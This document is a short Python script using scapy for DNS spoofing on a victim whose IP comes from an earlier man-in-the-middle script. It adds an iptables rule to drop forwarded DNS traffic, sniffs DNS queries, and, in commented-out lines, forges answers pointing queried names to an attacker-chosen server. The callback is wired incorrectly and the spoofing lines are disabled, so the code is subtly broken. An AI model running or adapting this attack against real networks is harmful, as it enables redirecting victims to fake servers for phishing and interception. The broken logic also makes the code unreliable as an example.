from scapy.all import sniff, DNS, DNSQR, DNSRR, srp, IP, Ether, sendp, UDP
from subprocess import Popen, PIPE
import sys

file1 = open('id.txt', 'r')
victimIP = file1.read()
if victimIP == "":
    print("You must first run the mitm.py script")
    sys.exit()
file1.close()
print("Please chose the ip of the fake server:")
gotoIP = input()

firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP" 
Popen([firewall], shell=True, stdout=PIPE)

def dnsspoof(rec : IP):
    if rec(IP).haslayer(DNS) and rec(IP).getlayer(DNS).qr==0:
        print("yeah")
        #spoof = IP(dst=a[0].getlayer(IP).src, src=a[0].getlayer(IP).dst)/UDP(dport=a[0].getlayer(UDP).sport, sport=a[0].getlayer(UDP).dport)/DNS(id=a[0].getlayer(DNS).id, qd=a[0].getlayer(DNS).qd, qr=1,an=DNSRR(rrname=a[0].getlayer(DNS).qd.qname, ttl=10, rdata=gotoIP) / DNSRR(rrname=a[0].getlayer(DNS).qd.qname, ttl=10, rdata=gotoIP))
        #sendp(spoof, verbose=1)



while True:
    a = sniff(prn = dnsspoof(IP),count=1, filter="udp port 53")
    


        
    


    



